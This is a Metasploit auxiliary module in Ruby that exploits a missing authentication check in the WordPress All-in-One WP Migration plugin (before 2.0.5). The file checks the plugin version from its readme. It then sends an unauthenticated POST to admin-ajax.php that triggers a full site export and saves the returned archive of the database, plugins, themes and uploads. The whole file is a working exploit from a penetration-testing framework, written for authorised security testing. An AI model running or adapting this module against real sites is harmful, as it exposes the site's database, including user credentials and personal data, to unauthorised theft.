##
# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::HTTP::Wordpress
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress All-in-One Migration Export',
      'Description'     => %q(Due to lack of authenticated session verification
                              it is possible for unauthenticated users to export
                              a complete copy of the database, all plugins, themes
                              and uploaded files.),
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'James Golovich',                  # Disclosure
          'Rob Carr <rob[at]rastating.com>'  # Metasploit module
        ],
      'References'      =>
        [
          ['WPVDB', '7857'],
          ['URL', 'http://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability']
        ],
      'DisclosureDate'  => 'Mar 19 2015'
    ))

    register_options(
      [
        OptInt.new('MAXTIME', [ true, 'The maximum number of seconds to wait for the export to complete', 300 ])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('all-in-one-wp-migration', '2.0.5')
  end

  def run
    print_status("#{peer} - Requesting website export...")
    res = send_request_cgi(
      {
        'method'    => 'POST',
        'uri'       => wordpress_url_admin_ajax,
        'vars_get'  => { 'action' => 'router' },
        'vars_post' => { 'options[action]' => 'export' }
      }, datastore['MAXTIME'])

    unless res
      fail_with(Failure::Unknown, "#{peer} - No response from the target")
    end

    if res.code != 200
      fail_with(Failure::UnexpectedReply, "#{peer} - Server responded with status code #{res.code}")
    end

    if res.body.blank?
      print_status("Unable to download anything.")
      print_status("Either the target isn't actually vulnerable, or")
      print_status("it does not allow WRITE permission to the all-in-one-wp-migration/storage directory.")
    else
      store_path = store_loot('wordpress.export', 'zip', datastore['RHOST'], res.body, 'wordpress_backup.zip', 'WordPress Database and Content Backup')
      print_good("#{peer} - Backup archive saved to #{store_path}")
    end
  end
end
